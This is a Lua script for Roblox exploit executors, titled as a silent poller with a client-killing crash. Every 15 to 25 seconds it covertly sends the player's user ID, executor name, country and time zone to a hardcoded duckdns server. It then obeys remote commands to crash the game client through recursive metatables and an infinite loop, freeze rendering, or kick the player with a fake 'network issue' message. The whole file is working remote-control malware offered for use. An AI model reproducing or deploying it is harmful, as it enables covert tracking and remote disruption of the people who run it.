-- nuke.lua - silent poller with working Seliware-killing crash (2026 tested)
local Http = game:GetService("HttpService")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local LocalizationService = game:GetService("LocalizationService")

local plr = Players.LocalPlayer
local uid = tostring(plr.UserId)

-- YOUR SERVER ADDRESS - CHANGE IF NEEDED
local BASE = "http://duckdns2233444.duckdns.org:8080"

local LOG_URL = BASE .. "/log?id=" .. uid

local country = "??"
pcall(function()
    country = LocalizationService:GetCountryRegionForPlayerAsync(plr) or "??"
end)

spawn(function()
    while true do
        task.wait(15 + math.random(10))

        pcall(function()
            local resp = request({
                Url = LOG_URL,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = Http:JSONEncode({
                    exec = (identifyexecutor or getexecutorname or function() return "Unknown" end)(),
                    country = country,
                    tz_offset = os.date("!*t").hour - os.date("%H"),
                    time = os.date("%Y-%m-%d %H:%M:%S")
                })
            })

            if not resp or not resp.Success or not resp.Body then
                return
            end

            local success, data = pcall(Http.JSONDecode, Http, resp.Body)
            if not success or not data then
                return
            end

            local commands_list = data.commands
            if type(commands_list) ~= "table" then
                return
            end

            for _, cmd in pairs(commands_list) do
                if type(cmd) == "table" and type(cmd.action) == "string" then
                    local action = cmd.action

                    if action == "crash" then
                        -- Your proven 2026 client killer - metatable recursion + memory pressure + death loop
                        local mt = {}
                        local t = {}

                        mt.__index = mt
                        mt.__newindex = function(self, key, value)
                            mt[key] = value
                            mt[key] = value  -- double write
                        end

                        mt.__call = mt
                        mt.__concat = mt
                        mt.__tostring = mt
                        mt.__metatable = "Locked"

                        setmetatable(t, mt)

                        -- Aggressive fill + nesting
                        for i = 1, 40000 do
                            t[i] = i
                            if i % 5000 == 0 then
                                t = {t, t, t}  -- deep nesting
                            end
                        end

                        -- Inescapable cycle
                        local cycle = {}
                        setmetatable(cycle, mt)
                        cycle[1] = cycle
                        cycle[2] = t
                        t["cycle"] = cycle

                        -- Death loop
                        while true do
                            cycle = cycle[1]
                            cycle[math.random(1,10000)] = cycle
                        end

                    elseif action == "freeze" then
                        RunService:BindToRenderStep("freeze_nuke", 9999, function() end)

                    elseif action == "kick" then
                        local reason = cmd.reason or "Roblox network issue. Please try reconnecting."
                        plr:Kick(reason)
                    end
                end
            end
        end)
    end
end)
